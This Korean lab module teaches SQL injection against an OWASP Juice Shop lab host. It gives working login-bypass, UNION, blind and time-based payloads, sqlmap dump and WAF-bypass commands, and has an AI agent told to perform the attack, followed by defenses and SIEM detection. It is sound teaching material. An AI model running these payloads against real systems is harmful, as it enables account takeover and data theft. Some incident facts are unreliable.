# Week 04: OWASP Top 10 (1) — SQL Injection

## 학습 목표
- SQL의 기본 문법(SELECT, WHERE, UNION)을 이해한다
- SQL Injection의 원리와 4가지 유형(Error/UNION/Blind/Time-based)을 구분한다
- JuiceShop에서 실제 SQL Injection 공격을 수행하여 관리자 권한을 획득한다
- sqlmap 자동화 도구를 활용하여 DB 구조와 데이터를 추출한다
- SQL Injection 방어 기법(매개변수화 쿼리, ORM, 입력 검증)을 설명한다
- 공격이 SIEM에서 어떻게 탐지되는지 파악한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 실습 기지, Bastion API :8003 |
| web | 10.20.30.80 | JuiceShop :3000 (공격 대상) |
| siem | 10.20.30.100 | Wazuh 탐지 확인 |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | OWASP Top 10 + SQL 기초 (Part 1~2) | 강의 |
| 0:30-1:00 | SQLi 원리·유형 (Part 3~4) | 강의 |
| 1:00-1:10 | 휴식 | - |
| 1:10-1:50 | JuiceShop 관리자 로그인 우회 (Part 5) | 실습 |
| 1:50-2:30 | UNION 데이터 추출 + Blind SQLi (Part 6) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | sqlmap 자동화 (Part 7) | 실습 |
| 3:10-3:30 | 방어 + SIEM 탐지 (Part 8~9) + Bastion | 실습 |
| 3:30-3:40 | 정리 + 과제 | 정리 |

---

# Part 1: OWASP Top 10 배경

OWASP(Open Web Application Security Project)는 웹 애플리케이션 보안을 위한 국제 비영리 단체다. **OWASP Top 10**은 가장 치명적인 웹 보안 위협 10가지를 정리한 목록으로, 모의해킹 보고서의 업계 표준 프레임워크다.

## OWASP Top 10 (2021)

| 순위 | 위협 | 본 과정 실습 주차 |
|------|------|-----------|
| A01 | Broken Access Control | Week 06 |
| A02 | Cryptographic Failures | (Week 03 JWT 예시) |
| A03 | **Injection (SQL, XSS 등)** | **Week 04, 05** |
| A04 | Insecure Design | (과제 토론) |
| A05 | Security Misconfiguration | Week 07 |
| A06 | Vulnerable Components | (Week 02 버전 탐지) |
| A07 | Authentication Failures | Week 06 |
| A08 | Software and Data Integrity | (SSDF 과목 참조) |
| A09 | Logging & Monitoring Failures | (SOC 과목) |
| A10 | Server-Side Request Forgery | Week 07 |

**이번 주(A03 Injection)가 OWASP에서 가장 오래 1위였던 이유:**
- 2013~2017년 OWASP Top 10 **1위**
- 2021년 3위로 내려갔으나 여전히 발생 빈도·피해 규모 최상위
- 단순한 기법이지만 방어 누락이 쉽게 발생

---

# Part 2: SQL 기초

SQL(Structured Query Language)은 데이터베이스를 조작하는 언어다. SQL Injection을 이해하려면 SQL 기본 문법을 알아야 한다.

## 2.1 기본 문법

```sql
-- 테이블에서 모든 데이터 조회
SELECT * FROM Users;

-- 조건부 조회
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';

-- 여러 조건 (AND, OR)
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '1234';

-- 결과 합치기 (UNION) — 두 쿼리의 결과를 위아래로 합침
SELECT id, email FROM Users
UNION
SELECT id, name FROM Products;

-- 주석 (뒷부분 무시)
SELECT * FROM Users WHERE email = 'admin' -- 이 뒤는 무시됨
SELECT * FROM Users WHERE email = 'admin' /* 블록 주석 */
```

**UNION의 규칙** (공격에서 중요):
- UNION으로 합치는 두 SELECT는 **컬럼 수가 같아야 한다**
- 컬럼의 **데이터 타입도 호환**되어야 한다

## 2.2 로그인 쿼리의 동작 (취약한 예시)

일반적인 웹 애플리케이션의 **취약한** 로그인 처리:

```
사용자 입력: email = "admin@juice-sh.op", password = "mypassword"

서버가 생성하는 SQL (문자열 연결):
SELECT * FROM Users
WHERE email = 'admin@juice-sh.op'
  AND password = 'mypassword'
```

결과가 있으면 로그인 성공, 없으면 실패. 공격자는 이 쿼리의 **논리를 조작**한다.

---

# Part 3: SQL Injection의 원리

## 3.1 왜 SQL Injection이 가능한가

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 **그대로** 삽입될 때 발생한다. 공격자가 입력에 SQL 구문을 넣어서 쿼리의 의미를 변경한다.

**정상 입력:**
```
입력: email = "admin@juice-sh.op"
쿼리: SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '...'
```

**공격 입력:**
```
입력: email = "' OR 1=1--"
쿼리: SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```

**쿼리 분해:**
- `email = ''` → 빈 문자열 비교 (거짓)
- `OR 1=1` → 항상 참
- `--` → SQL 주석, 뒤의 `AND password = '...'` 부분 무시
- 최종: `WHERE 거짓 OR 참` → 항상 참 → **모든 사용자 반환** → 첫 번째 사용자(admin)로 로그인 성공

## 3.2 왜 위험한가

SQL Injection으로 할 수 있는 것:

| 공격 | 결과 | 실제 사례 |
|------|------|-----------|
| 인증 우회 | 비밀번호 없이 로그인 | 2020 한국 대형쇼핑몰 100만건 유출 |
| 데이터 탈취 | 전체 DB 내용 읽기 | 2024 MOVEit CVE-2023-34362 글로벌 유출 |
| 데이터 변조 | 데이터 수정·삭제 | 랜섬 SQLi 사례 |
| 서버 장악 | xp_cmdshell(MSSQL)로 OS 명령 실행 | 2017 Equifax SQLi → APT |

---

# Part 4: SQL Injection 유형

## 4.1 Error-based SQLi

**정의:** SQL 오류 메시지가 응답에 노출되어 DB 정보를 직접 추출할 수 있는 경우.

**이것을 먼저 시도하는 이유:** 존재 여부를 확인하는 가장 빠른 방법. 따옴표(`'`) 하나만 넣어봐도 500 에러가 나면 SQLi 가능성이 매우 높다.

```bash
# 이메일 필드에 따옴표 하나 삽입 → SQL 구문 에러 유발
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"'","password":"test"}'
```

**명령 분해:**
- `-d '{"email":"'"'"'","password":"test"}'`: 셸에서 작은따옴표를 이스케이프하는 트릭. JSON 안에 `'`가 들어가도록 `'"'"'` 패턴으로 연결
- 결과적으로 서버는 `email=' password='test'` 형태의 요청을 받음

**예상 출력 (HTML 에러 페이지):**
```
OWASP Juice Shop (Express ^4.22.1)
500 Error
  at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
  at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50
```

**결과 해석 — 에러 메시지에서 얻은 정보:**
- `Express ^4.22.1`: Node.js Express 버전
- `sequelize/lib/dialects/sqlite`: **SQLite DB**, **Sequelize ORM** 사용
- `/juice-shop/node_modules/`: 앱 설치 경로

이 세 정보만으로 공격 방향이 구체화된다. 실무에서는 **커스텀 에러 페이지**로 이런 스택 트레이스를 숨겨야 한다.

## 4.2 UNION-based SQLi

**정의:** UNION SELECT로 다른 테이블의 데이터를 원래 쿼리의 결과와 합쳐서 가져온다.

**성공 조건:**
1. 원래 쿼리의 **컬럼 수**를 맞춰야 함
2. 컬럼의 **데이터 타입**이 호환되어야 함

```bash
# JuiceShop 검색 기능에 UNION 공격
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))+UNION+SELECT+1,2,3,4,5,6,7,8,9--" \
  | python3 -m json.tool 2>/dev/null | head -20
```

**URL 인코딩 주의:** `+`는 공백으로 해석되고, `'`는 `%27`로 써도 된다. JuiceShop은 URL 인코딩을 덜 엄격하게 처리하여 평문 `'`도 받는다.

**페이로드 분해:** `test'))+UNION+SELECT+1,2,3,4,5,6,7,8,9--`
- `test'))`: 원래 쿼리가 `WHERE ((name LIKE '%검색어%')...` 형태이므로 괄호 두 개 닫기
- `UNION SELECT 1,2,3,4,5,6,7,8,9`: 9개 컬럼 (JuiceShop Products 테이블 컬럼 수)
- `--`: 원래 쿼리의 나머지 주석 처리

**예상 출력 (성공 시):**
```json
{
    "status": "success",
    "data": [
        {"id":1, "name":"Apple Juice", ...},
        ...
        {"id":1, "name":"2", "description":"3", ...}   ← UNION으로 주입된 행!
    ]
}
```

컬럼 수가 맞지 않으면 에러가 난다. 맞는 컬럼 수를 찾기 위해 1,2,3부터 올리며 시도하는 것을 **"column count discovery"**라 한다.

## 4.3 Boolean-based Blind SQLi

**정의:** 응답에 결과가 직접 표시되지 않지만, "참/거짓"에 따라 응답 크기·내용이 달라지는 경우 한 비트씩 정보를 추출한다.

**왜 "블라인드"인가:** DB 에러나 UNION 결과가 화면에 나오지 않아도, "응답이 왔는가/안 왔는가", "응답 크기가 달라졌는가"로 조건의 참·거짓을 판별할 수 있다.

```bash
# 참 조건: 응답에 제품이 있음
TRUE_SIZE=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=1--" | wc -c)
echo "1=1 (참): $TRUE_SIZE bytes"

# 거짓 조건: 응답이 비어있음
FALSE_SIZE=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+1=2--" | wc -c)
echo "1=2 (거짓): $FALSE_SIZE bytes"
```

**예상 출력:**
```
1=1 (참): 1234 bytes
1=2 (거짓): 42 bytes
```

**결과 해석:** 응답 크기가 크게 다르면 Blind SQLi 가능. 이 차이를 이용해 `AND SUBSTR(password,1,1)='a'` 같은 조건을 하나씩 시도하여 비밀번호를 한 글자씩 추출한다. 손으로 하면 수백 번 요청 → sqlmap이 이 과정을 자동화한다 (Part 7).

## 4.4 Time-based Blind SQLi

**정의:** 응답 내용이 항상 같아서 Boolean조차 판별 불가할 때, **응답 시간**으로 참/거짓을 구분한다.

**원리:** 조건이 참이면 특정 시간 대기, 거짓이면 즉시 응답 → 응답 시간 차이로 판별.

```bash
# SQLite는 sleep() 함수가 없어 대안 기법 사용 (CPU 연산 유도)
# 참이면 무거운 연산, 거짓이면 안 함
echo "=== 참 조건 (CASE 동작) ==="
time curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(CASE+WHEN+1=1+THEN+randomblob(100000000)+ELSE+''+END)+IS+NOT+NULL--" > /dev/null

echo "=== 거짓 조건 (CASE 건너뜀) ==="
time curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(CASE+WHEN+1=2+THEN+randomblob(100000000)+ELSE+''+END)+IS+NOT+NULL--" > /dev/null
```

**명령 분해:**
- SQLite는 `sleep()` 대신 **`randomblob(큰_수)`**로 CPU 부하를 유도한다
- 참 조건에서는 1억 바이트 랜덤 생성 → 수 초 지연
- 거짓 조건에서는 CASE가 ELSE로 빠져 빠름

**예상 출력:**
```
=== 참 조건 (CASE 동작) ===
real    0m1.234s
=== 거짓 조건 (CASE 건너뜀) ===
real    0m0.032s
```

**결과 해석:** 응답 시간이 1초 이상 차이나면 Time-based Blind SQLi 성립. 수만 번 요청으로 한 글자씩 추출할 수 있어 Boolean-based보다 느리지만 **거의 모든 SQLi를 탐지할 수 있는 최후 수단**.

---

# Part 5: JuiceShop 관리자 로그인 우회 (Challenge)

JuiceShop에서 가장 유명한 SQLi 챌린지. 비밀번호 없이 admin 계정으로 로그인한다.

## 5.1 Step 1: 정상 로그인 실패 확인 (Baseline)

```bash
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}' \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "error": "Invalid email or password."
}
```

**의미:** admin 이메일은 존재하지만 비밀번호가 틀려서 실패. 이메일 존재 여부는 서비스가 다른 응답 메시지로 구분해주지 않으면 좋겠지만, JuiceShop은 그대로 알려준다.

## 5.2 Step 2: SQLi로 로그인 우회

```bash
# ' OR 1=1-- 을 이메일 필드에 삽입
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"anything"}' \
  | python3 -m json.tool
```

**생성되는 SQL:**
```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = 'anything'
```

**예상 출력:**
```json
{
    "authentication": {
        "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
        "bid": 1,
        "umail": "admin@juice-sh.op"
    }
}
```

**결과 해석:** `OR 1=1`로 조건이 항상 참 → `SELECT * FROM Users`와 동일 → 모든 행 반환 → 첫 번째 행이 admin → admin 세션 토큰 발급됨.

## 5.3 Step 3: 획득한 JWT 분석

```bash
# 토큰 저장
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"anything"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "Admin Token (앞 50자): ${ADMIN_TOKEN:0:50}..."

# JWT 페이로드 디코딩
echo "$ADMIN_TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (4 - len(p) % 4)
d = json.loads(base64.urlsafe_b64decode(p))
print(json.dumps(d, indent=2, ensure_ascii=False))
"
```

**예상 출력:**
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "isActive": true
  }
}
```

**결과 해석 — CRITICAL 발견:**
- `role: admin` 확인 — 이 토큰으로 모든 관리자 API 접근 가능
- `password` 필드에 **MD5 해시** 포함 (JuiceShop 의도적 취약점)
- 해시 값 `0192023a...500`은 **"admin123"**의 MD5 — crackstation.net에서 즉시 역산 가능

## 5.4 Step 4: Admin 토큰으로 API 접근

```bash
# 전체 사용자 목록 조회
curl -s http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'사용자 {len(d.get(\"data\",[]))}명 조회됨')"

# 관리자 페이지 접근
curl -s -o /dev/null -w "%{http_code}\n" \
  http://10.20.30.80:3000/administration \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

## 5.5 특정 사용자로 로그인 (컨트롤된 방식)

`' OR 1=1--`은 첫 번째 사용자로 들어간다. 특정 사용자를 지정하려면:

```bash
# admin 이메일을 직접 지정하고 비밀번호 검증만 주석 처리
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'"'"'--","password":"anything"}' \
  | python3 -m json.tool | head -10
```

**생성되는 SQL:**
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'anything'
```
- `email = 'admin@juice-sh.op'` → admin 이메일 정확히 지정
- `--` → 그 뒤 `AND password = ...` 전체 주석 처리

---

# Part 6: 데이터 추출 (UNION + Blind)

## 6.1 SQLite 테이블 구조 파악

SQLite는 `sqlite_master`라는 시스템 테이블에 전체 스키마 정보를 담고 있다.

```bash
# 컬럼 수 9개로 UNION (JuiceShop 검색 쿼리 기준)
curl -s "http://10.20.30.80:3000/rest/products/search?q=xyz'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" \
  | python3 -m json.tool 2>/dev/null | head -40
```

**페이로드 분해:**
- `xyz'))`: 원래 쿼리의 `((name LIKE '%xyz%') OR ...)` 괄호 두 개 닫기
- `UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master`: `sqlite_master.sql` 컬럼에 `CREATE TABLE` 문이 전부 들어있음
- `--`: 나머지 주석

**예상 출력 (일부):**
```json
{"data":[
  {"id":"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY, `username` VARCHAR, `email` VARCHAR, `password` VARCHAR, `role` VARCHAR, ...)", "name":"2", ...},
  {"id":"CREATE TABLE `Products` (...)", ...}
]}
```

**결과 해석:** `Users` 테이블의 컬럼 이름을 모두 확인 — `id, username, email, password, role`.

## 6.2 사용자 정보 추출

```bash
# 이메일 + 비밀번호 해시 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q=xyz'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('추출된 사용자:')
for row in d.get('data', []):
    email = row.get('id','')
    pw = row.get('name','')
    # UNION 결과는 원래 Products 스키마에 맞춰 들어가므로 id/name 필드에 이메일/비밀번호가 매핑됨
    if '@' in str(email):
        print(f'  {email:30s} {pw}')
"
```

**실행 결과 예시:**
```
추출된 사용자:
  admin@juice-sh.op              0192023a7bbd73250516f069df18b500
  jim@juice-sh.op                e541ca7ecf72b8d1286474e613..........
  bender@juice-sh.op             0c36e5.............................
  ...
```

**결과 해석:** 모든 사용자의 이메일과 MD5 패스워드 해시 확보. crackstation.net 또는 hashcat으로 일부는 즉시 역산 가능. Week 06 패스워드 공격에서 이어서 다룬다.

## 6.3 Boolean Blind SQLi로 admin 비밀번호 한 글자씩 추출

```bash
# admin의 password 필드 첫 글자가 '0'인지 확인
SIZE_0=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(SELECT+SUBSTR(password,1,1)+FROM+Users+WHERE+email='admin@juice-sh.op')='0'--" | wc -c)
echo "첫글자 '0'인지 확인: $SIZE_0 bytes"

# 첫 글자가 'a'인지 확인
SIZE_A=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+(SELECT+SUBSTR(password,1,1)+FROM+Users+WHERE+email='admin@juice-sh.op')='a'--" | wc -c)
echo "첫글자 'a'인지 확인: $SIZE_A bytes"
```

**결과 해석:** 응답 크기가 큰 쪽이 "참"인 조건. admin 해시는 `0192...`로 시작하므로 `'0'` 쿼리가 큰 응답, `'a'` 쿼리가 빈 응답이어야 한다. 수동으로 한 글자씩 맞추는 건 비효율적이므로 sqlmap(Part 7) 사용.

---

# Part 7: sqlmap 자동화

## 7.1 sqlmap이란

**정의:** SQL Injection 탐지·악용 자동화 전용 도구. 모든 SQLi 유형(Error/UNION/Boolean/Time-based/Stacked)을 자동 시도하고, DB·테이블·데이터 덤프까지 한 번에 수행한다.

**왜 sqlmap인가:** Part 4~6의 수작업을 수백·수천 번 반복해야 하는 데이터 추출을 자동화. 모의해킹 실무의 표준 도구.

## 7.2 설치 확인

```bash
which sqlmap || sudo apt-get install -y sqlmap 2>&1 | tail -3
sqlmap --version 2>/dev/null | head -1
```

**예상 출력:**
```
/usr/bin/sqlmap
1.7.2#stable
```

## 7.3 기본 탐지

```bash
# 검색 기능 URL에 대해 SQLi 자동 탐지
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --random-agent 2>&1 | tail -30
```

**옵션 분해:**
- `-u URL`: 검사할 URL
- `--batch`: 모든 프롬프트를 기본값 자동 응답 (비인터랙티브)
- `--random-agent`: User-Agent 무작위 (IPS 회피)

**예상 출력:**
```
[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing for SQL injection on GET parameter 'q'
[INFO] GET parameter 'q' is vulnerable. Do you want to keep testing the others? [y/N]
sqlmap identified the following injection point(s):
---
Parameter: q (GET)
    Type: boolean-based blind
    Payload: q=apple' AND 3567=3567 AND 'oXNz'='oXNz
    Type: error-based
    Payload: q=apple' AND (SELECT ... FROM sqlite_master)...
---
the back-end DBMS is SQLite
```

**결과 해석:** sqlmap이 이 URL의 `q` 파라미터가 **Boolean-based + Error-based** 두 가지 SQLi에 취약하며 DB가 SQLite임을 자동 판별.

## 7.4 테이블 목록 덤프

```bash
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --tables 2>&1 | tail -30
```

**옵션 분해:**
- `--tables`: 현재 DB의 모든 테이블 목록

**예상 출력:**
```
Database: SQLite_masterdb
[15 tables]
+--------------------+
| Addresses          |
| BasketItems        |
| Baskets            |
| Cards              |
| Challenges         |
| Complaints         |
| Deliveries         |
| Feedbacks          |
| Memories           |
| PrivacyRequests    |
| Products           |
| Quantities         |
| Recycles           |
| SecurityAnswers    |
| SecurityQuestions  |
| Users              |
+--------------------+
```

## 7.5 Users 테이블 덤프

```bash
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
  --batch -T Users --columns 2>&1 | tail -30

# 실제 데이터 덤프
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
  --batch -T Users -C email,password --dump 2>&1 | tail -40
```

**옵션 분해:**
- `-T 테이블`: 특정 테이블만
- `-C 컬럼1,컬럼2`: 특정 컬럼만
- `--dump`: 실제 데이터 출력

**예상 출력:**
```
Table: Users
[21 entries]
+------------------------+----------------------------------+
| email                  | password                         |
+------------------------+----------------------------------+
| admin@juice-sh.op      | 0192023a7bbd73250516f069df18b500 |
| jim@juice-sh.op        | e541ca7ecf72b8d1286474e613c...   |
...
```

**결과 해석:** 수작업으로 수백 번 요청해야 할 21건 데이터 추출을 sqlmap이 분단위로 완료. 이 해시는 Week 06 패스워드 공격에서 hashcat으로 크래킹.

## 7.6 WAF 우회 옵션

실제 환경에는 ModSecurity 같은 WAF가 있다. sqlmap은 `--tamper` 옵션으로 페이로드를 변형해 우회를 시도한다.

```bash
# 주요 tamper 스크립트 목록
sqlmap --list-tampers 2>&1 | head -20

# WAF 우회 시도 (주석을 공백으로 변환)
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
  --batch --tamper=space2comment,between 2>&1 | tail -10
```

**주요 tamper:**
- `space2comment`: 공백을 `/**/`로 치환
- `between`: `>`, `<`를 `BETWEEN ... AND ...`으로 변환
- `charencode`: 페이로드 URL 인코딩
- `randomcase`: SQL 키워드 대소문자 혼용 (SelECt)

---

# Part 8: SQL Injection 방어

**방어를 왜 배우는가?** 모의해킹 보고서의 "대응 방안" 섹션은 단순 권고가 아니라 **구체적 코드 예시**를 포함해야 전문가로 평가된다.

## 8.1 매개변수화된 쿼리 (Parameterized Queries) — 가장 효과적

**취약한 코드 (절대 하지 말 것):**
```javascript
// 문자열 연결로 SQL 생성 → SQLi 취약
const query = "SELECT * FROM Users WHERE email = '" + userInput + "'";
db.query(query);
```

**안전한 코드:**
```javascript
// 플레이스홀더(?)로 입력을 데이터로만 처리
const query = "SELECT * FROM Users WHERE email = ?";
db.query(query, [userInput]);
```

매개변수화에서는 `' OR 1=1--`을 입력해도 문자열 데이터로만 취급된다:
```sql
-- 실제 실행
SELECT * FROM Users WHERE email = ''' OR 1=1--'
-- → 문자열 "' OR 1=1--"과 일치하는 email을 찾음 → 당연히 없음 → 로그인 실패
```

**왜 작동하는가:** DB 드라이버가 SQL 구문과 데이터를 분리하여 컴파일하므로, 데이터 안의 어떤 문자도 SQL 구문으로 해석되지 않는다.

## 8.2 ORM 사용

ORM(Object-Relational Mapping)은 SQL을 직접 작성하지 않고 프로그래밍 언어의 객체로 DB를 조작한다. 내부적으로 매개변수화를 사용한다.

```javascript
// Sequelize ORM (JuiceShop이 사용하는 ORM)
const user = await User.findOne({
  where: { email: userInput }
});
```

**주의:** ORM도 raw SQL을 허용하는 기능(`sequelize.query`)이 있고, 그럴 때는 여전히 SQLi 가능. JuiceShop의 search 기능이 바로 그런 경우다.

## 8.3 입력 검증 (Input Validation) — 보조적

```javascript
// 이메일 형식 검증
if (!/^[a-zA-Z0-9@._-]+$/.test(userInput)) {
  throw new Error("Invalid email format");
}
```

**주의:** 입력 검증만으로는 불완전하다. 매개변수화와 **함께** 사용해야 한다.

## 8.4 최소 권한 원칙

웹 앱용 DB 계정에는 필요한 최소 권한만 부여:
- 웹 앱: `SELECT`, `INSERT`만
- 관리 작업: 별도 계정
- `DROP`, `ALTER` 같은 권한은 웹 앱에 절대 부여하지 않음

## 8.5 에러 메시지 제한

```javascript
try {
  await query(...);
} catch (err) {
  logger.error(err);         // 서버 로그에만 상세 기록
  res.status(500).send("Internal Server Error");  // 사용자에겐 일반 메시지
}
```

---

# Part 9: SIEM 탐지 (Wazuh)

SQL Injection 공격이 발생하면 Wazuh가 웹 서버 로그에서 패턴을 탐지한다.

## 9.1 Wazuh 알림 확인

```bash
# siem 서버에서 최근 알림 조회
ssh ccc@10.20.30.100 "sudo tail -30 /var/ossec/logs/alerts/alerts.json" 2>/dev/null \
  | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        rule = a.get('rule',{})
        if rule.get('level',0) >= 5:
            print(f'[{rule[\"level\"]}] {rule[\"description\"][:80]}')
    except: pass
" 2>/dev/null
```

**예상 알림 (있다면):**
- `SQL injection attempt` (웹 로그에서 `UNION`, `OR 1=1` 패턴)
- `Suspicious URL access` (관리자 경로 반복 접근)

**주의:** JuiceShop은 Apache 접근 로그를 Wazuh에 전달하도록 설정되어 있지 않을 수 있다. Week 08+ SOC 과정에서 이 파이프라인을 구성한다.

## 9.2 Suricata IPS의 탐지

```bash
# secu 서버에서 Suricata alert 확인
ssh ccc@10.20.30.1 "sudo tail -10 /var/log/suricata/fast.log" 2>/dev/null | head -5
```

**예상 출력 (있다면):**
```
03/28/2026-14:22:11.123456 [**] [1:2012887:3] ET WEB_SPECIFIC_APPS SQL Injection Attempt -- UNION SELECT [**]
```

**결과 해석:** Suricata의 Emerging Threats 룰셋이 SQLi 패턴을 탐지. Week 09~10에서 이 룰을 우회하는 기법을 다룬다.

---

# Part 10: Bastion 자연어 SQLi 테스트

수작업 SQLi 실습을 Bastion에게 자연어로 지시한다.

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "JuiceShop(http://10.20.30.80:3000)의 /rest/user/login 엔드포인트에 이메일 필드 SQL Injection을 시도해서 admin으로 로그인이 되는지 확인하고, 성공하면 JWT 토큰을 디코딩해서 role 필드를 보여줘."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

**예상 응답 (자연어 요약):**
```
SQL Injection 테스트 결과:

페이로드: ' OR 1=1--
HTTP 상태: 200 OK
응답: authentication.token 발급됨
JWT 디코딩 결과:
  email: admin@juice-sh.op
  role: admin
  id: 1

결론: 로그인 우회 성공. admin 권한 획득. CVSS 9.8 CRITICAL.
```

Evidence 확인:

```bash
curl -s "http://10.20.30.200:8003/evidence?limit=5" | python3 -c "
import sys, json
for e in json.load(sys.stdin)[:5]:
    msg = e.get('user_message','')[:70]
    ok = '✓' if e.get('success') else '✗'
    print(f'  {ok} {msg}')
"
```

---

## 과제 (다음 주까지)

### 과제 1: JuiceShop SQLi 완전 공략 보고서 (60점)

1. **관리자 로그인 우회** (15점)
   - `' OR 1=1--`로 admin 로그인
   - JWT 토큰 전체를 3부분으로 분리하여 페이로드 디코딩
   - 관리자 토큰으로 `/administration` 접근 성공 캡처

2. **UNION 기반 데이터 추출** (20점)
   - `rest/products/search` 엔드포인트에 UNION SELECT 페이로드 작성
   - `sqlite_master`에서 테이블 목록 추출
   - `Users` 테이블의 email + password 전체 추출 (최소 5건)

3. **Blind SQLi 시간 측정** (10점)
   - `AND 1=1` vs `AND 1=2`의 응답 크기 비교
   - Time-based (randomblob) 응답 시간 비교

4. **방어 코드 제안** (15점)
   - JuiceShop의 search 기능을 매개변수화된 쿼리로 수정하는 의사 코드 작성
   - ORM 사용으로 바꾸는 방법 추가 설명

### 과제 2: sqlmap 자동화 (40점)

**각 10점:**
1. `sqlmap --dbs`로 DB 목록 덤프
2. `sqlmap -T Users -C email,password --dump`로 Users 테이블 전체 덤프
3. `sqlmap --tamper=space2comment`로 WAF 우회 옵션 적용 결과
4. Bastion `/ask`로 SQLi 테스트를 자연어로 지시한 결과 + `/evidence` 기록 캡처

---

## 다음 주 예고

**Week 05: Cross-Site Scripting (XSS)**
- XSS의 3가지 유형 (Stored/Reflected/DOM)
- JavaScript 기초 (이벤트, 쿠키, localStorage 접근)
- JuiceShop XSS 챌린지 실습
- 쿠키/JWT 탈취 공격
- CSP(Content-Security-Policy) 방어

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **SQL** | Structured Query Language | DB 조작 언어 | 도서관 대출 신청서 양식 |
| **SQLi** | SQL Injection | 사용자 입력이 SQL에 섞이는 취약점 | 신청서에 "다 가져다줘" 낙서 |
| **UNION SELECT** | - | 두 SELECT 결과를 합치는 SQL 연산자 | 두 책장을 한 번에 검색 |
| **ORM** | Object-Relational Mapping | 객체로 DB를 다루는 라이브러리 | 주문 받아주는 웨이터 |
| **매개변수화 쿼리** | Parameterized Query | SQL과 데이터를 분리 처리 | 양식과 내용물 분리 봉인 |
| **Sequelize** | Sequelize | Node.js의 대표 ORM (JuiceShop이 사용) | JS용 ORM |
| **SQLite** | SQLite | 파일 기반 소형 DB (JuiceShop이 사용) | 가벼운 노트장 DB |
| **sqlmap** | sqlmap | SQLi 자동화 도구 | SQLi 드릴 |
| **Error-based** | - | SQL 에러로 정보 추출하는 기법 | 말실수 유도 |
| **UNION-based** | - | UNION으로 다른 테이블 추출 | 틈새로 다른 서랍 열기 |
| **Blind SQLi** | - | 결과가 안 보일 때 참/거짓으로 추출 | 예/아니오 스무고개 |
| **Time-based** | - | 응답 시간으로 참/거짓 판별 | "3초 기다려"로 신호 |

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 실제로 사용한 도구·서비스의 요점.

### sqlmap

> **역할:** SQL Injection 탐지·악용 자동화
> **설치:** `sudo apt-get install sqlmap`
> **실행 위치:** manager 또는 학생 PC

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.local/share/sqlmap/output/<host>/` | 세션·덤프 결과 (재실행 시 캐시됨) |
| `~/.local/share/sqlmap/output/<host>/log` | 요청·응답 로그 |
| `~/.local/share/sqlmap/output/<host>/session.sqlite` | 탐지 단계 스킵용 캐시 |

**핵심 옵션**

| 옵션 | 의미 | 이번 주 사용 예 |
|------|------|-----------------|
| `-u URL` | 검사 URL | `-u "...?q=apple"` |
| `--batch` | 자동 응답 | 인터랙티브 제거 |
| `--random-agent` | User-Agent 무작위 | IPS 회피 |
